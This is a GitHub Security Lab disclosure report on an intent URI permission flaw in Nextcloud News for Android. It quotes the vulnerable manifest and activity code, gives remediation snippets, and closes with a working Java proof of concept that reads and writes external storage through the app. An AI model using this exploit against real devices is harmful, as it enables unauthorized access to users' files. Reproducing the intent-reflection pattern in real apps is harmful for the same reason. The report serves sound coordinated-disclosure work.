# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2021-1033`

The [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [Nextcloud News for Android](https://github.com/nextcloud/news-android).

We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.

If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2021-1033` as a reference).

If you are _NOT_ the correct point of contact for this report, please let us know!

## Summary

The Nextcloud News for Android app has a security issue by which a malicious application installed on the same device can send it an arbitrary Intent that gets reflected back, unintentionally giving read and write access to non-exported Content Providers in Nextcloud News for Android.

## Product

Nextcloud News for Android

## Tested Version

0.9.9.62 (latest)

## Details

### Issue 1: Intent URI permission manipulation (`GHSL-2021-1033`)

The activity `SettingsActivity` is exported (since it has an `intent-filter`), as it can be seen in the Android Manifest:

[`AndroidManifest.xml:66`](https://github.com/nextcloud/news-android/blob/df13ae1c42f60dc9461278081ca3f6fd20a602e9/News-Android-App/src/main/AndroidManifest.xml#L66)

```xml
<activity
    android:name=".SettingsActivity"
    android:configChanges="keyboardHidden|orientation|screenSize"
    android:label="@string/title_activity_settings">
<intent-filter>
    <action android:name="de.luhmer.owncloudnewsreader.ACCOUNT_MANAGER_ENTRY" />
    <category android:name="android.intent.category.DEFAULT" />
</intent-filter>
</activity>
```

In its `onStart` method, this activity obtains the incoming `Intent` and returns it back to the calling application using `setResult`:

[`SettingsActivity.java:149`](https://github.com/nextcloud/news-android/blob/df13ae1c42f60dc9461278081ca3f6fd20a602e9/News-Android-App/src/main/java/de/luhmer/owncloudnewsreader/SettingsActivity.java#L149)

```java
@Override
protected void onStart() {
    super.onStart();
    Intent intent = getIntent();
    intent.putExtra(
            SettingsActivity.SP_FEED_LIST_LAYOUT,
            mPrefs.getString(SettingsActivity.SP_FEED_LIST_LAYOUT, "0")
    );
    setResult(RESULT_OK,intent);
}
```

Because of this, any application that uses `startActivityForResult` to start `SettingsActivity` with an arbitrary Intent will receive it back.

An attacker can exploit this by including the flags `FLAG_GRANT_URI_READ_PERMISSION` and/or `FLAG_GRANT_URI_WRITE_PERMISSION` in the Intent, which once returned by Nextcloud News will provide access to any of its Content Providers that has the attribute `android:grantUriPermissions="true"`, even if it is not exported.

Nextcloud News declares the `FileProvider` Content Provider in its Android Manifest:

[`AndroidManifest.xml:164`](https://github.com/nextcloud/news-android/blob/df13ae1c42f60dc9461278081ca3f6fd20a602e9/News-Android-App/src/main/AndroidManifest.xml#L164)

```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="${applicationId}.provider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_provider_paths" />
</provider>
```

The files it gives access to are defined in [`file_provider_paths`](https://github.com/nextcloud/news-android/blob/df13ae1c42f60dc9461278081ca3f6fd20a602e9/News-Android-App/src/main/res/xml/file_provider_paths.xml):

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths>
    <external-path
        name="external_files" path="." />
</paths>
```

With this information, and attacker can create an Intent targeted to `SettingsActivity` with the appropriate flags and the data URI `content://de.luhmer.owncloudnewsreader.provider/external_files/` to access the external storage using Nextcloud News as a proxy without needing to request the external storage permissions.

See the `Resources` section for a proof of concept exploiting this vulnerability.

#### Impact

This issue may lead to Privilege Escalation: a malicious application can use Nextcloud News for Android as a proxy to access the device's external storage without needing to request the appropriate permission to do so.

In a worst-case scenario, the attacker could overwrite files that are saved in the external storage and are owned and used by Nextcloud News to alter its functionality, since it is mentioned in [`PRIVACY.md`](https://github.com/nextcloud/news-android/blob/df13ae1c42f60dc9461278081ca3f6fd20a602e9/PRIVACY.md?plain=1#L34) that the external storage is used for caching purposes:

> * `android.permission.WRITE_EXTERNAL_STORAGE`
>
> Used for caching purposes / offline reading / storing podcasts 

#### Remediation

When it is needed to return data to the calling activity with `setResult`, use a new `Intent` that contains only the appropriate pieces of data (like extras) whenever possible. 

```java
Intent intent = new Intent();
// set extras as needed
setResult(Activity.RESULT_OK, intent);
```

If reusing the original Intent sent by the calling activity is needed, make sure that its `data` and `flags` are set to safe values:

```java
Intent intent = getIntent();
intent.setData(Uri.parse("content://safe/uri"));
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
// or
intent.removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.removeFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
setResult(RESULT_OK, intent);
```

Alternatively, check that the Intent's `data` and `flags` contain expected values:

```java
Intent intent = getIntent();
if (!intent.getData().equals(Uri.parse("content://safe/uri"))) {
    setResult(RESULT_CANCELED);
    return;
}
if (!((intent.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION) == 0
        && (intent.getFlags() & Intent.FLAG_GRANT_WRITE_URI_PERMISSION) == 0)) {
    setResult(RESULT_CANCELED);
    return;
}
setResult(RESULT_OK, intent);
```

#### Resources

The following PoC demonstrates how a malicious application with no special permissions could read and write from the external storage in behalf of Nextcloud News exploiting the issue mentioned above:

```java
public class IntentUriManipulationPoc extends Activity {

    public void poc() {
        Intent i = new Intent();
        i.setClassName("de.luhmer.owncloudnewsreader", "de.luhmer.owncloudnewsreader.SettingsActivity");
        i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        i.setData(Uri.parse("content://de.luhmer.owncloudnewsreader.provider/external_files/Documents/test.txt"));
        startActivityForResult(i, 5);
    }

    protected void onActivityResult(int requestCode, int  resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        try {
            OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
            outputStream.write("pwned".getBytes());
            Log.w("attacker", "Written!");
            InputStream inputStream = getContentResolver().openInputStream(data.getData());
            Log.w("attacker", IOUtils.toString(inputStream, StandardCharsets.UTF_8));
        } catch (Exception e) {
            Log.e("attacker", e.toString());
        }

    }
}
```

## GitHub Security Advisories

We recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).

## Credit

This issue was discovered and reported by the CodeQL static languages team member [@atorralba (Tony Torralba)](https://github.com/atorralba).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-1033` in any communication regarding this issue.

## Disclosure Policy

This report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).
